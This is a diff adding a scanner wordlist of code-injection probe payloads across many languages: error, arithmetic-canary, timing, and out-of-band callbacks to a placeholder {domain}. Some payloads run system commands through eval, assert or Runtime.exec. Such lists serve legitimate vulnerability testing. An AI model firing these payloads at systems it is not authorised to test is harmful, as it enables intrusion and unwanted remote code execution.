@@ -1,0 +1,113 @@
+##Code Injection - Error-Based##
+__import__("invalid")
+require('invalid')
+invalid_function()
+invalid_method
+use invalid;
+System.exit(-1)
+eval("invalid syntax here %%%")
+exec("raise Exception('probe')")
+$nonexistent->method()
+Kernel.exit(1)
+os.execute("invalidcmd")
+throw new Error("probe")
+die("probe")
+raise "probe"
+Import-Module InvalidModule
+java.lang.Runtime.getRuntime().exec("invalidcmd")
+${T(java.lang.Runtime).getRuntime().exec("invalidcmd")}
+
+##Code Injection - Math-Based (Canary: 1337)##
+7*191
+(7*191)
+eval("7*191")
+7*191;
+console.log(7*191)
+echo 7*191;
+puts 7*191
+abs(-1337)
+Math.abs(-1337)
+-1337.abs
+abs(-1337)
+__import__("math").factorial(0)+1336
+int(1337.0)
+parseInt("1337")
+intval("1337")
+Integer("1337")
+(1337).to_s.to_i
+7331-5994
+(function(){return 7*191})()
+eval("7*191")
+#{7*191}
+<%= 7*191 %>
+
+##Code Injection - Timing-Based##
+__import__("time").sleep(5)
+__import__('time').sleep(5)
+exec("import time;time.sleep(5)")
+sum(range(500000000))
+require('child_process').execSync('sleep 5')
+(function(){var t=Date.now();while(Date.now()-t<5000){}}())
+for(var i=0;i<5e9;i++){}
+Atomics.wait(new Int32Array(new SharedArrayBuffer(4)),0,0,5000)
+sleep(5)
+usleep(5000000)
+time_nanosleep(5,0)
+array_map(function($x){return $x*$x;},range(1,99999999))
+sleep(5);
+sleep 5
+Kernel.sleep(5)
+99999999.times{1+1}
+sleep(5)
+select(undef,undef,undef,5)
+java.lang.Thread.sleep(5000)
+${T(java.lang.Thread).sleep(5000)}
+Start-Sleep -Seconds 5
+[System.Threading.Thread]::Sleep(5000)
+
+##Code Injection - OOB (Built-in HTTP/stdlib)##
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+__import__('socket').create_connection(('{domain}',9999))
+__import__('http.client').client.HTTPConnection('{domain}',9999).request('GET','/')
+require('http').get('http://{domain}/nodeeval')
+require('net').connect(9999,'{domain}')
+fetch('http://{domain}/nodeeval')
+file_get_contents("http://{domain}/phpeval")
+fsockopen("{domain}",9999)
+fopen("http://{domain}/phpeval","r")
+stream_socket_client("tcp://{domain}:9999")
+require 'net/http'; Net::HTTP.get(URI('http://{domain}/rbeval'))
+TCPSocket.new('{domain}',9999)
+require('open-uri');URI.open('http://{domain}/rbeval')
+use IO::Socket::INET; IO::Socket::INET->new(PeerAddr=>'{domain}',PeerPort=>9999)
+use LWP::Simple; get("http://{domain}/pleval")
+new java.net.URL("http://{domain}/javaeval").openStream()
+new java.net.Socket("{domain}",9999)
+Invoke-WebRequest http://{domain}/pseval
+(New-Object Net.WebClient).DownloadString("http://{domain}/pseval")
+[System.Net.Sockets.TcpClient]::new('{domain}',9999)
+
+##Lua Code Injection##
+loadstring("return 7*191")()
+assert(loadstring('return 7*191'))()
+loadstring("error('1337')")()
+error('1337')
+local s=os.clock();while os.clock()-s<5 do end
+require('socket').sleep(5)
+require("socket").connect("{domain}", 80)
+require("socket.http").request("http://{domain}/lua")
+##PHP Code Injection##
+assert(system('echo 1337'))
+preg_replace('/.*/e','system("echo 1337")','')
+create_function('','return 7*191;')()
+assert(sleep(5)||1)
+assert(file_get_contents('http://{domain}/php'))
+##Perl Code Injection##
+eval('7*191')
+eval('select(undef,undef,undef,5)')
+##Java ScriptEngine Injection##
+var x=7*191
+java.lang.Runtime.getRuntime().exec('sleep 5')
+java.lang.Thread.sleep(5000)
+new java.net.URL("http://{domain}/nashorn").openStream()
+var u=new java.net.URL("http://{domain}/graaljs");var c=u.openConnection();c.getInputStream()
